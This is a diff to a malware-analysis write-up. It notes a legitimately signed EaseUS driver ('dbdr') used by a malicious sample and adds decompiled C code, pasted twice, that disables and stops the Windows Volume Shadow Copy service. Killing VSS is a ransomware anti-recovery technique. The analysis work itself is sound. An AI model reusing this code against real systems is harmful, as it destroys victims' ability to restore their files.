@@ -397,8 +397,8 @@ expand it on windows
 $ expand dbdr driver
 ```
 <br /><br />
-
 driver is legit 
+
 ```
     "General": {
         "PE Type": "driver",
@@ -416,8 +416,8 @@ driver is legit
     },
 ```
 <br /><br />
-
 driver sig is EaseUS
+
 ```sh
     "SignatureExtracted": {
         "CERT_0": {
@@ -433,6 +433,66 @@ driver sig is EaseUS
             "SerialNumberMD5": "705edf5c1af78770de4153bccb757055"
         }
     },
+```
+<br /><br />
+Disable vss
+
+```c
+        v14 = 0;
+        v15 = OpenSCManagerW(0, L"ServicesActive", 0xF003Fu);
+        TokenHandle.dwLowDateTime = (DWORD)v15;
+        if ( v15 )
+        {
+          v16 = OpenServiceW(v15, L"vss", 0x22u);
+          v17 = v16;
+          if ( v16 )
+          {
+            if ( !ChangeServiceConfigW(v16, 0x10u, 4u, 0xFFFFFFFF, 0, 0, 0, 0, 0, 0, 0) )
+              v14 = v11();
+            ControlService(v17, 1u, 0);
+            CloseServiceHandle(v17);
+            CloseServiceHandle((SC_HANDLE)TokenHandle.dwLowDateTime);
+          }
+          else
+          {
+            v14 = v11();
+            CloseServiceHandle((SC_HANDLE)TokenHandle.dwLowDateTime);
+          }
+        }
+        else
+        {
+          v14 = v11();
+        }
+```
+<br /><br />
+Disable vss
+
+```c
+        v14 = 0;
+        v15 = OpenSCManagerW(0, L"ServicesActive", 0xF003Fu);
+        TokenHandle.dwLowDateTime = (DWORD)v15;
+        if ( v15 )
+        {
+          v16 = OpenServiceW(v15, L"vss", 0x22u);
+          v17 = v16;
+          if ( v16 )
+          {
+            if ( !ChangeServiceConfigW(v16, 0x10u, 4u, 0xFFFFFFFF, 0, 0, 0, 0, 0, 0, 0) )
+              v14 = v11();
+            ControlService(v17, 1u, 0);
+            CloseServiceHandle(v17);
+            CloseServiceHandle((SC_HANDLE)TokenHandle.dwLowDateTime);
+          }
+          else
+          {
+            v14 = v11();
+            CloseServiceHandle((SC_HANDLE)TokenHandle.dwLowDateTime);
+          }
+        }
+        else
+        {
+          v14 = v11();
+        }
 ```
 
 ## Dumped 
